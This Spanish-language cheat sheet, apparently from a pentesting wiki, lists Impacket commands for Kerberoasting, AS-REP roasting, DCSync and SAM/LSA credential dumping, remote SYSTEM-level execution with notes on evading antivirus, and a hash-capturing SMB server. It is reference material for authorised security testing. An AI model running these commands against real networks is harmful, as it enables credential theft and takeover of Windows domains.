---
title: "Impacket Cheat Sheet"
description: "Colección de scripts en Python para interacción con protocolos de red (SMB, Kerberos, DCERPC)."
image: "/images/wiki/5.png"
---

# Impacket: Python Network Protocol Library

**Impacket** es una colección de clases de Python para trabajar con protocolos de red. Es esencial para realizar ataques desde sistemas Linux (como Kali) contra entornos Windows sin necesidad de "vivir de la tierra" en una máquina comprometida.

[Repositorio Oficial](https://github.com/SecureAuthCorp/impacket)

## Enumeración y Ataques de Identidad

### GetUserSPNs.py (Kerberoasting)
Solicita Service Tickets (TGS) para cuentas con SPN y extrae el hash para crackearlo offline.

```bash
# Listar y extraer hashes
python GetUserSPNs.py <Domain>/<User>:<Password> -outputfile hashes.txt

# Si tienes el hash NTLM en lugar de password
python GetUserSPNs.py <Domain>/<User> -hashes <LMhash>:<NThash> -outputfile hashes.txt
```

### GetNPUsers.py (AS-REP Roasting)
Busca usuarios que tienen "Do not require Kerberos preauthentication" activado.

```bash
# Intentar obtener TGTs cifrados para una lista de usuarios
python GetNPUsers.py <Domain>/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```

### secretsdump.py (DCSync y Dumpeo)
Extrae secretos remotamente. Puede leer SAM, LSA y NTDS.dit si tiene privilegios.

```bash
# DCSync: Extraer hash NTLM de un usuario específico simulando ser un DC
python secretsdump.py <Domain>/<User>:<Password>@<TargetDC> -just-dc-ntlm -just-dc-user <TargetUser>

# DCSync: Extraer TODO el dominio (requiere ser Domain Admin o similar)
python secretsdump.py <Domain>/<User>:<Password>@<TargetDC> -just-dc-ntlm

# Dumpeo local (SAM/LSA) si tienes credenciales de admin local
python secretsdump.py <Domain>/<User>:<Password>@<TargetIP>
```

## Ejecución Remota

### psexec.py
Ejecución de comandos con privilegios de SYSTEM mediante la subida de un servicio binario remoto y pipes SMB.
```bash
python psexec.py <Domain>/<User>:<Password>@<TargetIP>
```

### smbexec.py
Similar a psexec pero no sube binarios (fileless). Usa `%COMSPEC%` y redirige salida a un archivo temporal. Más sigiloso contra antivirus de archivos, pero genera logs de eventos.
```bash
python smbexec.py <Domain>/<User>:<Password>@<TargetIP>
```

### wmiexec.py
Usa WMI (Windows Management Instrumentation) para ejecución. Generalmente menos detectado que psexec, pero la salida puede ser lenta.
```bash
python wmiexec.py <Domain>/<User>:<Password>@<TargetIP>
```

## Servidores Falsos

### smbserver.py
Crea un servidor SMB rápido en tu máquina Linux para recibir archivos o capturar hashes NTLM.

```bash
# Compartir la carpeta actual como "SHARE"
python smbserver.py SHARE . -smb2support
```
